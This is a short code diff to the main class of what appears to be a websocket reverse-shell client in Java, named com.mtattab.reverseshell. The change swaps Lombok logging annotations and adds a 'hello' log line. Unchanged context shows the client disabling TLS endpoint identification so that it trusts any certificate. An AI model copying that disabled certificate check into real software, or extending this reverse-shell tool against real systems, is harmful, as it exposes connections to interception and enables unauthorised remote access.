@@ -2,6 +2,8 @@ package com.mtattab.reverseshell;
 
 
 import com.mtattab.reverseshell.service.impl.WebsocketReverseShellServiceImpl;
+import lombok.extern.java.Log;
+import lombok.extern.log4j.Log4j;
 import lombok.extern.slf4j.Slf4j;
 import org.eclipse.jetty.util.ssl.SslContextFactory;
 import org.eclipse.jetty.websocket.api.Session;
@@ -11,12 +13,13 @@ import org.eclipse.jetty.websocket.client.WebSocketClient;
 import java.net.URI;
 
 import java.util.concurrent.Future;
-@Slf4j
+@Log
 public class Main {
 
 
 
     public static void main(String[] args)  {
+        log.info("hello");
         // Create a custom TrustManager that trusts all certificates
         SslContextFactory.Client ssl = new SslContextFactory.Client(); // ssl config
         ssl.setEndpointIdentificationAlgorithm(null); // disable endpoint identification algorithm.
